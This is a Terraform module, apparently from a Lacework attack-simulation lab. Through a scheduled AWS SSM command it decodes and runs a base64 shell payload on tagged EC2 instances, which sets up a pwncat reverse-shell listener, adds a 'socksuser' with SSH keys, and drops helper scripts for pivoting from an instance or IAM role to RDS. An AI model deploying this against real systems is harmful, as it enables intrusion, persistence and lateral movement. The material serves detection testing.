locals {
    listen_port = var.listen_port
    listen_ip = var.listen_ip
    attack_dir = "/pwncat"
    attack_script = "pwncat.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_pwncat.lock"
    base64_command_payload = base64encode(var.payload)
    payload = <<-EOT
    LOCKFILE="${ local.lock_file }"
    if [ -e "$LOCKFILE" ]; then
        echo "Another instance of the script is already running. Exiting..."
        exit 1
    fi
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    check_apt() {
        pgrep -f "apt" || pgrep -f "dpkg"
    }
    while check_apt; do
        log "Waiting for apt to be available..."
        sleep 10
    done
    if ! which proxychains > /dev/null; then
        log "installing proxychains..."
        apt-get update && apt-get install -y proxychains
    else
        log "proxychains already installed - skipping..."
    fi
    if ! ls /home/socksuser/.ssh/socksuser_key > /dev/null; then
        log "adding socksuser..."
        adduser socksuser >> $LOGFILE 2>&1
        log "adding ssh keys for socks user..."
        sudo -H -u socksuser /bin/bash -c "mkdir -p /home/socksuser/.ssh" >> $LOGFILE 2>&1
        sudo -H -u socksuser /bin/bash -c "ssh-keygen -t rsa -b 4096 -f /home/socksuser/.ssh/socksuser_key" >> $LOGFILE 2>&1
        sudo -H -u socksuser /bin/bash -c "cat ~/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
        sudo -H -u socksuser /bin/bash -c "chmod 600 /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
        log "socksuser setup complete..."
    else
        log "socksuser already exists - skipping..."
    fi
    log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
    screen -S pwncat -X quit
    truncate -s 0 /tmp/pwncat.log
    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
    cd ${local.attack_dir}
    echo ${local.pwncat} | base64 -d > ${local.attack_script}
    echo ${local.delayed_start} | base64 -d > ${local.start_script}
    echo ${local.listener} | base64 -d > listener.py
    echo ${local.responder} | base64 -d > plugins/responder.py
    echo ${local.instance2rds} | base64 -d > resources/instance2rds.sh
    echo ${local.iam2rds} | base64 -d > resources/iam2rds.sh
    echo ${local.iam2rds_assumerole} | base64 -d > resources/iam2rds_assumerole.sh
    log "installing required python3.9..."
    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 >> $LOGFILE 2>&1
    python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    log "starting background delayed script start..."
    nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
    log "background job started"
    log "done."
    EOT
    base64_payload = base64encode(local.payload)

    
    pwncat          = base64encode(templatefile(
                                "${path.module}/resources/pwncat.sh",
                                {
                                    listen_port = local.listen_port
                                }
                            ))

    delayed_start   = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    lock_file = local.lock_file
                                    attack_delay = var.attack_delay
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))

    listener        = base64encode(file(
                                "${path.module}/resources/listener.py", 
                            ))
    responder       = base64encode(templatefile(
                                "${path.module}/resources/responder.py", 
                                {
                                    default_payload = var.payload,
                                    iam2rds_role_name = var.iam2rds_role_name
                                    iam2rds_session_name = var.iam2rds_session_name
                                }
                            ))
    instance2rds    = base64encode(templatefile(
                                "${path.module}/resources/instance2rds.sh", 
                                {
                                    region = var.region,
                                    environment = var.environment,
                                    deployment = var.deployment
                                }
                            ))

    iam2rds         = base64encode(templatefile(
                                "${path.module}/resources/iam2rds.sh", 
                                {
                                    region = var.region,
                                    environment = var.environment,
                                    deployment = var.deployment,
                                    iam2rds_role_name = var.iam2rds_role_name
                                    iam2rds_session_name = var.iam2rds_session_name
                                }
                            ))
    
    iam2rds_assumerole = base64encode(templatefile(
                                "${path.module}/resources/iam2rds_assumerole.sh",
                                {
                                    region = var.region,
                                    environment = var.environment,
                                    deployment = var.deployment,
                                    iam2rds_role_name = var.iam2rds_role_name
                                    iam2rds_session_name = var.iam2rds_session_name
                                }
                            ))
    
}

###########################
# SSM 
###########################

resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

resource "aws_ssm_document" "this" {
  name          = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "attack simulation",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "${var.timeout}",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${var.tag} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "this" {
    name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    resource_query {
        query = jsonencode({
                    ResourceTypeFilters = [
                        "AWS::EC2::Instance"
                    ]

                    TagFilters = [
                        {
                            Key = "${var.tag}"
                            Values = [
                                "true"
                            ]
                        },
                        {
                            Key = "deployment"
                            Values = [
                                var.deployment
                            ]
                        },
                        {
                            Key = "environment"
                            Values = [
                                var.environment
                            ]
                        }
                    ]
                })
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "this" {
    association_name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    name = aws_ssm_document.this.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.this.name,
        ]
    }

    compliance_severity = "HIGH"

    # cronjob
    schedule_expression = "${var.cron}"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}